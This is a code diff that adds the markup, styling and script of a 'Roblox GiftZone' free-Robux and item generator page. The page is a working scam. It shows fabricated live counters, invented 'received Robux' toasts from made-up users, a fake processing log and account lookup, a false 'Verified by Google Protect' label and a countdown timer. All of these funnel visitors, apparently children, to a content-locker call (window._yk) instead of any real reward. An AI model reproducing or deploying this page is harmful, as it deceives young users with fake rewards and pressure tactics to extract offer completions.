@@ -619,6 +619,40 @@ backdrop-filter: blur(40px);
       animation: blink 2s infinite;
     }
 
+    .amount {
+      min-height: 124px;
+      border-width: 2px;
+      opacity: 0;
+      transform: scale(.3);
+      animation: emerge .48s ease-out forwards;
+    }
+
+    .amount:nth-child(2) { animation-delay: .08s; }
+    .amount:nth-child(3) { animation-delay: .16s; }
+    .amount:nth-child(4) { animation-delay: .24s; }
+
+    .amount .icon {
+      width: 44px;
+      height: 44px;
+      vertical-align: middle;
+    }
+
+    .amount-number {
+      margin-top: 4px;
+      font-size: 22px;
+      font-weight: 900;
+    }
+
+    .available {
+      margin-top: 8px;
+      padding: 5px 8px;
+      border-radius: 4px;
+      background: var(--emerald);
+      color: white;
+      font-size: 11px;
+      font-weight: 900;
+    }
+
     .showcase {
       display: flex;
       align-items: center;
@@ -649,6 +683,58 @@ backdrop-filter: blur(40px);
       font-weight: 900;
       text-transform: uppercase;
       letter-spacing: 1px;
+    }
+
+    .progress-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      color: #374151;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .bar {
+      height: 20px;
+      margin-bottom: 14px;
+      overflow: hidden;
+      border-radius: 999px;
+      background: #e5e7eb;
+    }
+
+    .bar span {
+      display: block;
+      width: 0;
+      height: 100%;
+      border-radius: inherit;
+      background: var(--emerald);
+      transition: width .1s linear;
+    }
+
+    .logs {
+      max-height: 132px;
+      overflow: auto;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid var(--line);
+      border-radius: 7px;
+      background: #f9fafb;
+      color: #374151;
+      font-size: 14px;
+      line-height: 1.55;
+    }
+
+    .ready-icon {
+      display: grid;
+      place-items: center;
+      min-height: 70px;
+      margin-bottom: 14px;
+      animation: levitate 3s ease-in-out infinite;
+    }
+
+    .ready-icon .icon {
+      width: 68px;
+      height: 68px;
     }
 
     .info-box {
@@ -1002,6 +1088,7 @@ backdrop-filter: blur(40px);
     @keyframes breathe { 50% { transform: scale(1.04); opacity: .92; } }
     @keyframes shine { to { transform: translateX(80%) rotate(30deg); } }
     @keyframes appear { from { opacity: 0; transform: translateY(-12px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes emerge { 0% { opacity: 0; transform: scale(.3); } 55% { transform: scale(1.06); } 100% { opacity: 1; transform: scale(1); } }
     @keyframes rewardBeat { 50% { transform: scale(1.12); filter: drop-shadow(0 0 14px rgba(147, 51, 234, .65)); } }
     @keyframes levitate { 50% { transform: translateY(-14px); } }
     @keyframes pulse { 70% { transform: scale(1.04); box-shadow: 0 0 0 12px rgba(147, 51, 234, 0); } }
@@ -1009,10 +1096,43 @@ backdrop-filter: blur(40px);
     @keyframes toastOut { to { transform: translateX(390px); opacity: 0; } }
     @keyframes landingCardIn { from { opacity: 0; transform: translateY(30px) scale(.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
     @keyframes landingLogoPulse { 50% { box-shadow: 0 8px 40px rgba(0, 0, 0, .5); } }
-    @keyframes rotate-loader { to { transform: rotate(360deg); } }
+    @keyframes cardFloat {
+  0% {
+    transform: translateY(0px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  }
+
+  50% {
+    transform: translateY(-10px);
+    box-shadow: 0 30px 80px rgba(0,0,0,0.7);
+  }
+
+  100% {
+    transform: translateY(0px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  }
+}
+    @keyframes neonPulse {
+  0%, 100% {
+    box-shadow:
+      0 0 10px rgba(0, 212, 255, 0.4),
+      0 0 25px rgba(0, 212, 255, 0.25),
+      0 0 45px rgba(147, 51, 234, 0.15),
+      0 0 60px rgba(0, 212, 255, 0.10);
+  }
+
+  50% {
+    box-shadow:
+      0 0 18px rgba(0, 212, 255, 0.8),
+      0 0 40px rgba(0, 212, 255, 0.5),
+      0 0 80px rgba(147, 51, 234, 0.35),
+      0 0 100px rgba(0, 212, 255, 0.2);
+  }
+}
     @media (max-width: 390px) {
       .app { padding-inline: 12px; }
       .panel { padding: 18px 14px; }
+      .choice-title { font-size: 18px; }
       .reward-number { font-size: 32px; }
       .landing-card { padding: 38px 24px 32px; }
       .item-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
@@ -1032,4 +1152,698 @@ backdrop-filter: blur(40px);
     })(window, document, "clarity", "script", "wukpmuw7ii");
 </script>
 </head>
-<body class="
+<body class="landing-active">
+  <svg aria-hidden="true" width="0" height="0" style="position:absolute;overflow:hidden">
+    <symbol id="logoIcon" viewBox="0 0 520 160">
+      <defs>
+        <linearGradient id="logoGradient" x1="0" x2="1" y1="0" y2="1">
+          <stop stop-color="#7c3aed"/>
+          <stop offset="1" stop-color="#10b981"/>
+        </linearGradient>
+        <filter id="logoShadow" x="-20%" y="-20%" width="140%" height="140%">
+          <feDropShadow dx="0" dy="12" stdDeviation="10" flood-color="#35105e" flood-opacity=".25"/>
+        </filter>
+      </defs>
+      <rect x="20" y="26" width="120" height="108" rx="28" fill="url(#logoGradient)" filter="url(#logoShadow)"/>
+      <rect x="60" y="66" width="40" height="40" rx="8" fill="#fff" transform="rotate(15 80 86)"/>
+      <text x="164" y="78" fill="#232527" font-family="Montserrat, Arial, sans-serif" font-size="46" font-weight="900">Roblox</text>
+      <text x="166" y="116" fill="#9333ea" font-family="Montserrat, Arial, sans-serif" font-size="30" font-weight="800">BOOSTER</text>
+      <circle cx="448" cy="55" r="30" fill="#f59e0b"/>
+      <rect x="438" y="45" width="20" height="20" rx="4" fill="#fff" transform="rotate(18 448 55)"/>
+    </symbol>
+    <symbol id="coinIcon" viewBox="0 0 128 128">
+      <defs>
+        <radialGradient id="coinGradient" cx="35%" cy="25%">
+          <stop stop-color="#fff7ad"/>
+          <stop offset=".45" stop-color="#fbbf24"/>
+          <stop offset="1" stop-color="#b45309"/>
+        </radialGradient>
+      </defs>
+      <circle cx="64" cy="64" r="56" fill="url(#coinGradient)"/>
+      <circle cx="64" cy="64" r="43" fill="none" stroke="#fff3b0" stroke-width="8" opacity=".75"/>
+      <rect x="47" y="47" width="34" height="34" rx="7" fill="#fffdf0" transform="rotate(18 64 64)"/>
+      <circle cx="64" cy="64" r="8" fill="#d97706"/>
+    </symbol>
+    <symbol id="diamondIcon" viewBox="0 0 128 128">
+      <defs>
+        <linearGradient id="diamondGradient" x1="0" x2="1" y1="0" y2="1">
+          <stop stop-color="#cffafe"/>
+          <stop offset=".45" stop-color="#60a5fa"/>
+          <stop offset="1" stop-color="#2563eb"/>
+        </linearGradient>
+      </defs>
+      <path d="M24 38 42 18h44l18 20-40 72Z" fill="url(#diamondGradient)"/>
+      <path d="M24 38h80M42 18l22 92M86 18 64 110M42 18 54 38 64 18 74 38 86 18" fill="none" stroke="#eff6ff" stroke-width="5" stroke-linejoin="round" opacity=".8"/>
+    </symbol>
+    <symbol id="avatarIcon" viewBox="0 0 160 160">
+      <rect width="160" height="160" rx="80" fill="#ede9fe"/>
+      <circle cx="80" cy="62" r="30" fill="#9333ea"/>
+      <path d="M34 142c7-31 25-47 46-47s39 16 46 47" fill="#10b981"/>
+      <circle cx="68" cy="58" r="5" fill="#fff"/>
+      <circle cx="92" cy="58" r="5" fill="#fff"/>
+    </symbol>
+  </svg>
+
+  <section class="landing-screen" id="landingScreen">
+    <canvas id="stars"></canvas>
+    <div class="landing-card">
+      <div class="landing-logo">
+  <img src="NNN.png" alt="Logo">
+</div>
+      <h1>Welcome to ROBLOX GIFTZONE</h1>
+      <div class="landing-actions">
+        <button class="landing-btn cyan" data-entry="rbx" onclick="handleLandingEntry('rbx')">RBX HERE</button>
+        <button class="landing-btn red" data-entry="brainrot" onclick="handleLandingEntry('brainrot')">STEAL A BRAINROT</button>
+        <button class="landing-btn green" data-entry="tsunami" onclick="handleLandingEntry('tsunami')">ESCAPE TSUNAMI</button>
+      </div>
+      <footer> ©2026 All rights reserved.</footer>
+    </div>
+    <div class="landing-toast" id="landingToast"></div>
+  </section>
+
+  <main class="app hidden" id="generatedApp">
+    <div class="toast-wrap" id="toastWrap"></div>
+
+    <header class="brand">
+      <div class="brand-mark">
+        <svg class="brand-logo" viewBox="0 0 520 160" role="img" aria-label="Roblox GiftCenter"><use href="#logoIcon"></use></svg>
+        <span class="year">2026</span>
+      </div>
+      <div>
+        <h1>Roblox Gift center</h1>
+        <p class="subhead">The latest updated online tool for Roblox</p>
+      </div>
+    </header>
+
+    <section class="metrics" aria-label="Live reward counters">
+      <div class="live"><span><i class="dot"></i> LIVE TODAY</span></div>
+      <h2>People Who Claimed Today</h2>
+      <div class="metric-grid">
+        <div class="metric-card">
+          <svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg>
+          <div class="metric-value" id="coinUsers">8,547</div>
+          <div class="metric-name">Robux Claimed</div>
+        </div>
+        <div class="metric-card" style="animation-delay:.2s">
+          <svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg>
+          <div class="metric-value" id="gemUsers">6,923</div>
+          <div class="metric-name">Diamonds Claimed</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="panel" id="phase0">
+      <h2>Choose Your Reward Type</h2>
+      <div class="reward-grid">
+        <button class="choice" data-type="robux">
+          <svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg>
+          <div class="choice-title">ROBUX</div>
+          <div class="choice-info">Roblox Currency</div>
+          <span class="select-pill">SELECT</span>
+        </button>
+        <button class="choice" data-type="diamond">
+          <svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg>
+          <div class="choice-title">DIAMOND</div>
+          <div class="choice-info">Premium Gems</div>
+          <span class="select-pill">SELECT</span>
+        </button>
+      </div>
+    </section>
+
+    <section class="panel hidden" id="phase1">
+      <h2>Enter Your Robux Username</h2>
+      <div class="input-wrap">
+        <span>@</span>
+        <input id="userInput" type="text" autocomplete="nickname" placeholder="Your Roblox Username">
+      </div>
+      <button class="primary-btn" id="lookupBtn"><span id="lookupText">SEARCH USER</span></button>
+      <div class="alert" id="alertBox">Please enter a username to continue.</div>
+
+      <div class="account" id="accountCard">
+        <div class="profile">
+          <div class="avatar-wrap">
+            <svg class="avatar" viewBox="0 0 160 160" role="img" aria-label="User avatar"><use href="#avatarIcon"></use></svg>
+            <i class="activity"></i>
+          </div>
+          <div>
+            <h3 id="fullName">Player</h3>
+            <p id="userHandle">@player</p>
+          </div>
+        </div>
+        <div class="details">
+          <div class="detail"><strong>📅</strong><span class="detail-label">Created</span><span class="detail-value" id="joinDate">Jan 12, 2023</span></div>
+          <div class="detail"><strong>📶</strong><span class="detail-label">Status</span><span class="tag">Online</span></div>
+          <div class="detail"><strong>🛡</strong><span class="detail-label">Account</span><span class="tag">Active</span></div>
+        </div>
+        <button class="primary-btn" id="continueBtn" style="margin-top:16px">CONTINUE</button>
+      </div>
+    </section>
+
+    <section class="panel hidden" id="phase2">
+      <h2>Select Robux Amount</h2>
+      <div class="amount-grid" id="robuxChoices">
+        <button class="amount" data-kind="robux" data-amount="800"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg><div class="amount-number">800</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="robux" data-amount="5800"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg><div class="amount-number">5,800</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="robux" data-amount="25000"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg><div class="amount-number">25,000</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="robux" data-amount="100000"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button>
+      </div>
+    </section>
+
+    <section class="panel hidden" id="phase2_5">
+      <h2>Select Diamond Amount</h2>
+      <div class="amount-grid">
+        <button class="amount" data-kind="diamond" data-amount="100"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg><div class="amount-number">100</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="diamond" data-amount="250"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg><div class="amount-number">250</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="diamond" data-amount="700"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg><div class="amount-number">700</div><div class="available">AVAILABLE</div></button>
+        <button class="amount" data-kind="diamond" data-amount="7000"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button>
+      </div>
+    </section>
+
+    <section class="panel hidden" id="phase3">
+      <h2>Processing Request</h2>
+      <div class="showcase">
+        <span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg></span>
+        <div>
+          <div class="reward-number" id="rewardNumber">0</div>
+          <div class="reward-type" id="rewardType">Generating</div>
+        </div>
+      </div>
+      <div class="progress-row"><span>⚙ Processing request...</span><strong id="taskPercent">0%</strong></div>
+      <div class="bar"><span id="taskBar"></span></div>
+      <div class="logs" id="taskLogs"><div>✓ Connecting to servers...</div></div>
+      <p class="subhead" style="text-align:center">User: <strong id="userShow">Username</strong></p>
+    </section>
+
+    <section class="panel hidden" id="phase4">
+      <div id="checkSection">
+        <h2>Verified by Google Protect</h2>
+        <div class="ready-icon" id="readyIcon"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg></div>
+        <div style="text-align:center">
+          <p id="prizeShow" style="font-weight:800;margin:0 0 8px"></p>
+          <p class="subhead">User: <strong id="userShow2">Username</strong></p>
+        </div>
+        <div class="info-box">
+          <div>ℹ Your rewards are ready to be added</div>
+          <div>⚠ Click NEXT for the final step</div>
+        </div>
+        <button class="primary-btn pulse" id="claimBtn">🎁 NEXT</button>
+      </div>
+      <div id="doneSection" class="hidden">
+        <h2 style="color:var(--emerald)">Generated Successfully!</h2>
+        <div class="success">
+          <div id="completePrize"></div>
+          <p>Generated for <span id="userShow3">Username</span></p>
+        </div>
+        <div class="notice">Verification is required to unlock the reward page. No Roblox password is needed.</div>
+        <button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button>
+        <p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <p>© 2026 All rights reserved.</p>
+    </footer>
+  </main>
+
+  <section class="item-app hidden" id="itemApp">
+    <div class="item-shell">
+      <header class="item-hero">
+        <div class="item-logo" id="itemLogo">🌊</div>
+        <div>
+          <h1 id="itemTitle">Escape Tsunami Rewards</h1>
+          <p id="itemSubtitle">Choose one item, verify your username, then unlock the final reward step.</p>
+        </div>
+        <div class="active-strip">
+          <span>ACTIVE USERS</span>
+          <strong id="itemActiveUsers">12,845</strong>
+        </div>
+      </header>
+
+      <div class="select-line" id="itemSelectLine">Select Your Tsunami Reward</div>
+      <div class="item-grid" id="itemGrid"></div>
+    </div>
+  </section>
+
+  <div class="item-modal" id="itemModal" aria-hidden="true">
+    <div class="item-dialog" id="itemDialog"></div>
+  </div>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+    const phases = ["phase0", "phase1", "phase2", "phase2_5", "phase3", "phase4"].map($);
+    const state = { type: "", amount: 0, user: "" };
+    const itemState = { mode: "", selected: null, username: "" };
+    let coinTotal = 8547;
+    let gemTotal = 6923;
+    let landingToastTimer;
+    let itemActiveTotal = 12845;
+
+    const itemConfigs = {
+      tsunami: {
+        themeClass: "",
+        logo: "🌊",
+        title: "Escape Tsunami Rewards",
+        subtitle: "Pick a rare Brainrot helper, confirm your Roblox username, and escape with your reward.",
+        selectLine: "Select Your Tsunami Reward",
+        toast: "Escaping the Tsunami...",
+        items: [
+          ["🐘", "Strawberry Elephant", "OG"],
+          ["🍔", "Burgerini Bearini", "OG"],
+          ["🚜", "Bulbito Bandito Traktorito", "Rare"],
+          ["💎", "Alessio", "Celestial"],
+          ["🌀", "Dug Dug Dug", "Celestial"],
+          ["🏫", "Esok Sekolah", "Celestial"],
+          ["🦬", "Bisonte Giuppitere", "Secret"],
+          ["🐉", "Dragon Cannelloni", "Secret"],
+          ["🦕", "Nuclearo Dinossauro", "Secret"],
+          ["🍋", "Perochello Lemonchello", "Rare"],
+          ["🐧", "Salamino Penguino", "Rare"],
+          ["🕷", "Chimpanzini Spiderini", "Mythic"]
+        ]
+      },
+      brainrot: {
+        themeClass: "brainrot-theme",
+        logo: "🧠",
+        title: "Steal a Brainrot",
+        subtitle: "Choose a limited Brainrot item and complete the final unlock step.",
+        selectLine: "Select a Brainrot Item",
+        toast: "Stealing a Brainrot...",
+        items: [
+          ["🐘", "Strawberry Elephant", "OG"],
+          ["🐱", "Meowl", "OG"],
+          ["🚽", "Skibidi Toilet", "OG"],
+          ["🐉", "Hydra Dragon Cannelloni", "Secret"],
+          ["🥤", "Fizzy Soda", "Rare"],
+          ["🐼", "Boba Panda", "Rare"],
+          ["🎄", "Festive 67", "Limited"],
+          ["🍬", "Los Candies", "Limited"],
+          ["🧟", "Headless Horseman", "Mythic"],
+          ["🐋", "Capitano Moby", "Mythic"],
+          ["💰", "$1000000", "VIP"],
+          ["⚡", "Admin Commands", "VIP"]
+        ]
+      }
+    };
+
+    function iconSvg(name, extraClass = "") {
+      const viewBox = name === "avatar" ? "0 0 160 160" : "0 0 128 128";
+      return `<svg class="icon ${extraClass}" viewBox="${viewBox}" aria-hidden="true"><use href="#${name}Icon"></use></svg>`;
+    }
+
+    function showLandingToast(message) {
+      const toast = $("landingToast");
+      toast.textContent = message;
+      toast.classList.add("show");
+      clearTimeout(landingToastTimer);
+      landingToastTimer = setTimeout(() => toast.classList.remove("show"), 2000);
+    }
+
+    function enterGeneratedApp() {
+      $("landingScreen").classList.add("is-hidden");
+      $("generatedApp").classList.remove("hidden");
+      $("itemApp").classList.add("hidden");
+      document.body.classList.remove("landing-active");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function enterItemApp(mode) {
+      const config = itemConfigs[mode];
+      itemState.mode = mode;
+      itemState.selected = null;
+      itemState.username = "";
+      $("landingScreen").classList.add("is-hidden");
+      $("generatedApp").classList.add("hidden");
+      $("itemApp").className = `item-app ${config.themeClass}`.trim();
+      $("itemLogo").textContent = config.logo;
+      $("itemTitle").textContent = config.title;
+      $("itemSubtitle").textContent = config.subtitle;
+      $("itemSelectLine").textContent = config.selectLine;
+      renderItemGrid(config);
+      document.body.classList.remove("landing-active");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function renderItemGrid(config) {
+      $("itemGrid").innerHTML = config.items.map(([icon, name, rarity]) => `
+        <button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}" type="button">
+          <div class="loot-art">${icon}</div>
+          <div class="loot-name">${name}</div>
+          <div class="rarity">${rarity}</div>
+        </button>
+      `).join("");
+      document.querySelectorAll(".loot-card").forEach((card) => {
+        card.addEventListener("click", () => openItemModal({
+          icon: card.dataset.icon,
+          name: card.dataset.name,
+          rarity: card.dataset.rarity
+        }));
+      });
+    }
+
+    function handleLandingEntry(entry) {
+      if (entry === "rbx") {
+        showLandingToast("Loading your RBX...");
+        setTimeout(enterGeneratedApp, 600);
+      } else if (entry === "brainrot") {
+        showLandingToast(itemConfigs.brainrot.toast);
+        setTimeout(() => enterItemApp("brainrot"), 600);
+      } else {
+        showLandingToast(itemConfigs.tsunami.toast);
+        setTimeout(() => enterItemApp("tsunami"), 600);
+      }
+    }
+
+    window.handleLandingEntry = handleLandingEntry;
+
+    function triggerContentLocker() {
+      if (typeof window._yk === "function") {
+        window._yk();
+        return;
+      }
+
+      const button = $("lockerBtn");
+      const original = button.textContent;
+      button.disabled = true;
+      button.textContent = "Loading...";
+      let tries = 0;
+
+      const waitForLocker = setInterval(() => {
+        tries += 1;
+        if (typeof window._yk === "function") {
+          clearInterval(waitForLocker);
+          button.disabled = false;
+          button.textContent = original;
+          window._yk();
+        } else if (tries >= 20) {
+          clearInterval(waitForLocker);
+          button.disabled = false;
+          button.textContent = original;
+          alert("The unlock system is still loading. Please check your connection and try again.");
+        }
+      }, 250);
+    }
+
+    window.triggerContentLocker = triggerContentLocker;
+
+    function openItemModal(item) {
+      itemState.selected = item;
+      $("itemModal").classList.add("visible");
+      $("itemModal").setAttribute("aria-hidden", "false");
+      $("itemDialog").innerHTML = `
+        <div class="modal-art">${item.icon}</div>
+        <h2>${item.name}</h2>
+        <p>Would you like to get this ${item.rarity} reward?</p>
+        <input id="itemUsername" type="text" placeholder="Enter your Roblox username" autocomplete="nickname">
+        <div class="dialog-actions">
+          <button class="small-btn cancel" id="itemCancel" type="button">Cancel</button>
+          <button class="small-btn continue" id="itemContinue" type="button">Continue</button>
+        </div>
+      `;
+      $("itemCancel").addEventListener("click", closeItemModal);
+      $("itemContinue").addEventListener("click", searchItemUser);
+      $("itemUsername").addEventListener("keydown", (event) => {
+        if (event.key === "Enter") searchItemUser();
+      });
+      setTimeout(() => $("itemUsername").focus(), 50);
+    }
+
+    function closeItemModal() {
+      $("itemModal").classList.remove("visible");
+      $("itemModal").setAttribute("aria-hidden", "true");
+    }
+
+    function searchItemUser() {
+      const username = $("itemUsername").value.trim();
+      if (!username) {
+        $("itemUsername").style.borderColor = "#ef4444";
+        return;
+      }
+      itemState.username = username;
+      showItemLoading(`Searching for @${username}`);
+      setTimeout(() => showItemResult(username), 1200);
+    }
+
+    function showItemLoading(text) {
+      $("itemDialog").innerHTML = `
+        <div class="loader-stack">
+          <div class="loader-ring"></div>
+          <h2>${text}</h2>
+          <p>Please wait while we prepare your request.</p>
+        </div>
+      `;
+    }
+
+    function showItemResult(username) {
+      const item = itemState.selected;
+      $("itemDialog").innerHTML = `
+        <div class="modal-art">${item.icon}</div>
+        <h2>@${username}</h2>
+        <p>${item.name} is ready to transfer.</p>
+        <button class="primary-btn" id="itemTransfer" type="button">Continue</button>
+      `;
+      $("itemTransfer").addEventListener("click", () => {
+        showItemLoading(`Transferring ${item.name} to @${username}`);
+        setTimeout(showItemFinal, 1400);
+      });
+    }
+
+    function showItemFinal() {
+      const item = itemState.selected;
+      $("itemDialog").innerHTML = `
+        <div class="final-card">
+          <div class="modal-art">${item.icon}</div>
+          <h2>${item.name} Generated!</h2>
+          <p>Final verification is required to unlock the reward page.</p>
+          <button class="primary-btn pulse" type="button" onclick="triggerContentLocker()">NEXT 🎁</button>
+        </div>
+      `;
+    }
+
+    function setupStars() {
+      const canvas = $("stars");
+      const ctx = canvas.getContext("2d");
+      let width = 0;
+      let height = 0;
+      let stars = [];
+
+      function resizeStars() {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+        stars = Array.from({ length: 100 }, () => ({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          r: Math.random() * 1.5,
+          a: Math.random()
+        }));
+      }
+
+      function drawStars() {
+        ctx.clearRect(0, 0, width, height);
+        stars.forEach((star) => {
+          ctx.beginPath();
+          ctx.arc(star.x, star.y, star.r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255,255,255,${star.a})`;
+          ctx.fill();
+        });
+        requestAnimationFrame(drawStars);
+      }
+
+      window.addEventListener("resize", resizeStars);
+      resizeStars();
+      drawStars();
+    }
+
+    setupStars();
+
+    document.querySelectorAll(".landing-btn").forEach((button) => {
+      button.addEventListener("click", () => handleLandingEntry(button.dataset.entry));
+    });
+
+    function showPhase(id) {
+      phases.forEach((phase) => phase.classList.toggle("hidden", phase.id !== id));
+      setTimeout(() => $(id).scrollIntoView({ behavior: "smooth", block: "start" }), 80);
+    }
+
+    function format(num) {
+      return Number(num).toLocaleString();
+    }
+
+    function countUp(id, target) {
+      const el = $(id);
+      const start = Number(el.textContent.replace(/,/g, ""));
+      const step = Math.max(1, Math.ceil((target - start) / 20));
+      let value = start;
+      const tick = setInterval(() => {
+        value += step;
+        if (value >= target) {
+          value = target;
+          clearInterval(tick);
+        }
+        el.textContent = format(value);
+      }, 45);
+    }
+
+    function updateMetrics() {
+      coinTotal += Math.floor(Math.random() * 90) + 520;
+      gemTotal += Math.floor(Math.random() * 90) + 480;
+      countUp("coinUsers", coinTotal);
+      countUp("gemUsers", gemTotal);
+    }
+
+    function toast() {
+      const names = ["Alex_Pro", "Sarah_Gaming", "Mike_Player", "Emma_2026", "John_RBX", "Lisa_Cool", "Tom_Legend", "Mia_Queen"];
+      const coins = [800, 1200, 2500, 5800, 10000, 25000];
+      const gems = [100, 250, 700, 1500, 7000];
+      const div = document.createElement("div");
+      div.className = "toast";
+      div.innerHTML = `${iconSvg("avatar", "avatar-icon")}<div><strong>${names[Math.floor(Math.random() * names.length)]}</strong><span>Received ${format(coins[Math.floor(Math.random() * coins.length)])} Robux + ${format(gems[Math.floor(Math.random() * gems.length)])} Diamonds</span></div>`;
+      $("toastWrap").appendChild(div);
+      setTimeout(() => div.remove(), 5000);
+    }
+
+    document.querySelectorAll(".choice").forEach((choice) => {
+      choice.addEventListener("click", () => {
+        document.querySelectorAll(".choice").forEach((item) => item.classList.remove("picked"));
+        choice.classList.add("picked");
+        state.type = choice.dataset.type;
+        setTimeout(() => showPhase("phase1"), 450);
+      });
+    });
+
+    $("lookupBtn").addEventListener("click", () => {
+      const user = $("userInput").value.trim();
+      if (!user) {
+        $("alertBox").style.display = "block";
+        $("userInput").focus();
+        return;
+      }
+      $("alertBox").style.display = "none";
+      $("lookupText").textContent = "SEARCHING...";
+      $("lookupBtn").disabled = true;
+      setTimeout(() => {
+        state.user = user;
+        $("fullName").textContent = user;
+        $("userHandle").textContent = `@${user}`;
+        $("joinDate").textContent = new Date(Date.now() - 1000 * 60 * 60 * 24 * (250 + user.length * 17)).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" });
+        $("accountCard").classList.add("visible");
+        $("lookupText").textContent = "SEARCH USER";
+        $("lookupBtn").disabled = false;
+      }, 800);
+    });
+
+    $("userInput").addEventListener("keydown", (event) => {
+      if (event.key === "Enter") $("lookupBtn").click();
+    });
+
+    $("continueBtn").addEventListener("click", () => {
+      ["userShow", "userShow2", "userShow3"].forEach((id) => $(id).textContent = state.user);
+      showPhase(state.type === "diamond" ? "phase2_5" : "phase2");
+    });
+
+    document.querySelectorAll(".amount").forEach((amount) => {
+      amount.addEventListener("click", () => {
+        document.querySelectorAll(".amount").forEach((item) => item.classList.remove("picked"));
+        amount.classList.add("picked");
+        state.amount = Number(amount.dataset.amount);
+        state.type = amount.dataset.kind;
+        setTimeout(runProgress, 420);
+      });
+    });
+
+    function animateReward(target) {
+      let value = 0;
+      const step = Math.max(1, Math.ceil(target / 180));
+      const tick = setInterval(() => {
+        value += step;
+        if (value >= target) {
+          value = target;
+          clearInterval(tick);
+        }
+        $("rewardNumber").textContent = format(value);
+      }, 35);
+    }
+
+    function log(text) {
+      const line = document.createElement("div");
+      line.textContent = `✓ ${text}`;
+      $("taskLogs").appendChild(line);
+      $("taskLogs").scrollTop = $("taskLogs").scrollHeight;
+    }
+
+    function runProgress() {
+      const isDiamond = state.type === "diamond";
+      $("rewardIcon").innerHTML = iconSvg(isDiamond ? "diamond" : "coin");
+      $("rewardType").textContent = isDiamond ? "Diamonds" : "Robux";
+      $("taskBar").style.width = "0";
+      $("taskPercent").textContent = "0%";
+      $("taskLogs").innerHTML = "<div>✓ Connecting to servers...</div>";
+      $("rewardNumber").textContent = "0";
+      showPhase("phase3");
+      animateReward(state.amount);
+
+      let progress = 0;
+      const tick = setInterval(() => {
+        progress += 1;
+        $("taskBar").style.width = `${progress}%`;
+        $("taskPercent").textContent = `${progress}%`;
+        if (progress === 10) log("Searching database...");
+        if (progress === 30) log("Account found!");
+        if (progress === 45) log(`User ${state.user} confirmed`);
+        if (progress === 60) log(`Generating ${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}...`);
+        if (progress === 75) log("Encrypting data...");
+        if (progress === 90) log("Preparing final confirmation...");
+        if (progress === 100) {
+          clearInterval(tick);
+          setTimeout(() => {
+            const icon = isDiamond ? "diamond" : "coin";
+            $("readyIcon").innerHTML = iconSvg(icon);
+            $("prizeShow").textContent = `${format(state.amount)} ${isDiamond ? "Diamonds are" : "Robux are"} ready!`;
+            $("completePrize").innerHTML = `${iconSvg(icon)} <strong>${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}</strong>`;
+            showPhase("phase4");
+          }, 700);
+        }
+      }, 70);
+    }
+
+    $("claimBtn").addEventListener("click", () => {
+      $("checkSection").classList.add("hidden");
+      $("doneSection").classList.remove("hidden");
+      let seconds = 300;
+      const countdown = setInterval(() => {
+        seconds -= 1;
+        const minutes = String(Math.floor(seconds / 60)).padStart(2, "0");
+        const rest = String(seconds % 60).padStart(2, "0");
+        $("timer").textContent = `${minutes}:${rest}`;
+        if (seconds <= 0) clearInterval(countdown);
+      }, 1000);
+    });
+
+    setInterval(updateMetrics, 2600);
+    setInterval(toast, 12000);
+    setTimeout(toast, 900);
+  </script>
+  <audio id="bg-music" loop>
+  <source src="popo.mp3" type="audio/mpeg">
+</audio>
+  <script>
+  function startMusic() {
+    const music = document.getElementById("bg-music");
+    if (!music) return;
+
+    music.volume = 0.5;
+    music.play();
+
+    document.removeEventListener("click", startMusic);
+    document.removeEventListener("keydown", startMusic);
+    document.removeEventListener("touchstart", startMusic);
+  }
+
+  document.addEventListener("click", startMusic);
+  document.addEventListener("keydown", startMusic);
